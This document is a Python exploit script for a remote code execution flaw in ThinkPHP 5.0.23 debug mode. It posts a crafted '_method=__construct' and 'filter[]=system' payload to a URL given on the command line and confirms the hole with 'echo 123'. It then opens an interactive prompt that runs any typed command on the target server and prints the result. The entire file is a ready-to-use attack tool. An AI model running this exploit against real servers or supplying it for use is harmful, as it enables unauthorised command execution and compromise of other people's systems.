# by 自由公式 From vFREE Updated in 2021/6/14
# title:thinkphp 5.0.23 debug model RCE
import requests
import sys
import re
try:
  url = sys.argv[1]
  data = {
      '_method' : '__construct',
      'filter[]' : 'system',
      'server[REQUEST_METHOD]' : 'echo 123'
            }
  re_rule = r'123'

  def run_again():
    run('y')

  def command():
    yn = input('Do you want to continue with the command(y/n):')
    if yn == 'y':
          run('y')
    else:
          run('n')


  def check_1():
      response = requests.post(url,data=data,timeout=10)
      if re.search(re_rule,response.text):
        print('[+]url:'+url)
        print('[+]Found Vuln')
        command()
        
      else:
          print('[+]Not Found Vuln')

  def run(yon):
        if yon == 'y':
          inp = input('>>>')
          data_2 = {
            '_method' : '__construct',
            'filter[]' : 'system',
            'server[REQUEST_METHOD]' : inp
          }
          response_2 = requests.post(url,data=data_2)
          resub = re.sub(r'\s','   ',response_2.text)
          resub_2 = re.sub(r'<html.*>.*</html>','',resub)
          print(resub_2)
          run_again()
        else:
          print('Bye!!!')
        


  if __name__ == '__main__':
      check_1()


except KeyboardInterrupt:
  print('^C\n[!]Quit!!!\nUser Stop Input')

except IndexError:
  print('*'*60)
  print('''
  Userage:
    python3 tp-scan.py URL/IP
  ''')
  print('*'*60)
except requests.exceptions.ReadTimeout:
  print('*'*60)
  print('\n[!]Connect Error: TimeOut>10s')
  print('[!]Please Check URL/IP,Again!!!')
  print('*'*60)
except requests.exceptions.InvalidURL:
  print('*'*60)
  print('\n[!]URL Error!!!')
  print('*'*60)
except requests.exceptions.MissingSchema:
    print('*'*60)
    print('\n[!]URL Error!!!')
    print('You input url:'+url)
    print('Please check if there is "http://"')
    print('*'*60)